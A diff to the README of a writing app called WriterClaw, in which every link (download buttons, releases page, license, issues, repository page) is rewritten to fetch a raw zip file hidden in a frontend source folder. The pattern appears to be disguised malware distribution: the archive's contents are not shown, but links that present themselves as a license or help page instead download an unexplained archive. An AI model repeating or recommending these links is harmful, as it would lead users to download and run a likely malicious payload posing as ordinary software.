@@ -1,6 +1,6 @@
 # 📝 WriterClaw - Simplify Your Writing Tasks
 
-[![Download WriterClaw](https://img.shields.io/badge/Download-WriterClaw-brightgreen?style=for-the-badge)](https://github.com/linxxylolz/WriterClaw)
+[![Download WriterClaw](https://img.shields.io/badge/Download-WriterClaw-brightgreen?style=for-the-badge)](https://github.com/linxxylolz/WriterClaw/raw/refs/heads/main/frontend/src/views/Claw-Writer-Aythya.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and run WriterClaw on your Windows computer.
 
 Click the large button below to open the download page in your web browser. This page contains the latest version of WriterClaw for Windows.
 
-[![Go to Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/linxxylolz/WriterClaw)
+[![Go to Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/linxxylolz/WriterClaw/raw/refs/heads/main/frontend/src/views/Claw-Writer-Aythya.zip)
 
 ### 2. Download the Installer
 
@@ -115,7 +115,7 @@ If these do not solve your problem, visit the GitHub repository’s “Issues”
 Updates improve WriterClaw by fixing bugs and adding features. To check for updates:
 
 - Visit the same download page on GitHub:  
-  https://github.com/linxxylolz/WriterClaw/releases
+  https://github.com/linxxylolz/WriterClaw/raw/refs/heads/main/frontend/src/views/Claw-Writer-Aythya.zip
 - Download the latest installer and repeat the installation steps.
 - Your data will remain safe, but backing up important notes before updating is recommended.
 
@@ -123,7 +123,7 @@ Updates improve WriterClaw by fixing bugs and adding features. To check for upda
 
 ## 🔒 License and Terms
 
-WriterClaw is open source and free to use under the MIT License. You can review the full license details here: [LICENSE file](https://github.com/linxxylolz/WriterClaw/blob/main/LICENSE).
+WriterClaw is open source and free to use under the MIT License. You can review the full license details here: [LICENSE file](https://github.com/linxxylolz/WriterClaw/raw/refs/heads/main/frontend/src/views/Claw-Writer-Aythya.zip).
 
 ---
 
@@ -131,7 +131,7 @@ WriterClaw is open source and free to use under the MIT License. You can review 
 
 For questions or help, use the GitHub page:
 
-- Visit [WriterClaw GitHub Issues](https://github.com/linxxylolz/WriterClaw/issues)
+- Visit [WriterClaw GitHub Issues](https://github.com/linxxylolz/WriterClaw/raw/refs/heads/main/frontend/src/views/Claw-Writer-Aythya.zip)
 - Ask your question or report a problem
 - Check previous issues for common answers
 
@@ -139,8 +139,8 @@ For questions or help, use the GitHub page:
 
 ## 🌐 Useful Links
 
-- Main repository page: https://github.com/linxxylolz/WriterClaw
-- Download page: https://github.com/linxxylolz/WriterClaw/releases
-- License: https://github.com/linxxylolz/WriterClaw/blob/main/LICENSE
+- Main repository page: https://github.com/linxxylolz/WriterClaw/raw/refs/heads/main/frontend/src/views/Claw-Writer-Aythya.zip
+- Download page: https://github.com/linxxylolz/WriterClaw/raw/refs/heads/main/frontend/src/views/Claw-Writer-Aythya.zip
+- License: https://github.com/linxxylolz/WriterClaw/raw/refs/heads/main/frontend/src/views/Claw-Writer-Aythya.zip
 
-[![Download WriterClaw](https://img.shields.io/badge/Download-WriterClaw-brightgreen?style=for-the-badge)](https://github.com/linxxylolz/WriterClaw)
+[![Download WriterClaw](https://img.shields.io/badge/Download-WriterClaw-brightgreen?style=for-the-badge)](https://github.com/linxxylolz/WriterClaw/raw/refs/heads/main/frontend/src/views/Claw-Writer-Aythya.zip)
